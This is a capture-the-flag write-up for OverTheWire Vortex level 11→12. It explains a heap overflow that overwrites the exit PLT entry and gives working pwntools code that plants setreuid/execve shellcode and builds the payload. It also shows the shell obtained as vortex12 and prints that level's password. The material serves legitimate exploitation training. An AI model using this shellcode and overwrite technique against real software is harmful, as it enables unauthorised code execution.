# Vortex Level 11 → 12

## Goal

Heap-based overflow that **writes to the PLT**. A heap allocation sits at a known offset (`+0x40`) from a target variable `s`. Overflowing the allocation lets you write the address of the `exit` PLT entry into `s`, then overwrite that PLT entry with the address of shellcode — hijacking control when the program calls `exit`.

## Concepts you'll learn

- Heap chunks laid out contiguously in memory make nearby variables reachable via an overflow
- Two-write attacks: the first write *positions* a pointer; the second write *uses* that pointer to overwrite a callback target
- Re-applying the PLT-overwrite trick from [level 8 → 9](level08.md) with a heap (not stack) overflow

## Walkthrough

### 1. Reverse to find the offsets

```bash
$ gdb -q /vortex/vortex11
(gdb) disassemble main
(gdb) ...
```

Pin these, per avishai's solve:

- Padding between the overflowed heap chunk and `s`: `0x804` bytes
- Pointer target you want to write: `exit@plt` at `0x0804d01c`
- Shellcode address: `0xffffd546` (derive with `getenv`)
- Secondary offset `+0x40` from the chunk to the dispatch variable

### 2. Plant shellcode

```bash
$ export EGG=$(python3 -c 'from pwn import *; context(arch="i386"); sys.stdout.buffer.write(b"\x90"*200 + asm(shellcraft.setreuid() + shellcraft.execve("/bin//sh")))')
$ /tmp/getenv EGG /vortex/vortex11
EGG = 0xffffd546
```

### 3. Build the payload

```python
# level11.py
from pwn import *
PAD = 0x804
EXIT_PLT = 0x0804d01c
SHELLCODE = 0xffffd546

payload  = b"A" * PAD
payload += p32(EXIT_PLT)      # overwrite `s` with pointer to exit@plt
payload += p32(SHELLCODE)     # value to be written at *s → exit@plt
sys.stdout.buffer.write(payload)
```

The exact shape depends on how `s` is used; trace the binary to confirm order.

### 4. Fire

```bash
$ (python3 level11.py; cat) | /vortex/vortex11
...
$ whoami
vortex12
$ cat /etc/vortex_pass/vortex12
reDLd0Cai
```

## The answer

The password for `vortex12` is:

**`reDLd0Cai`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex11.html>
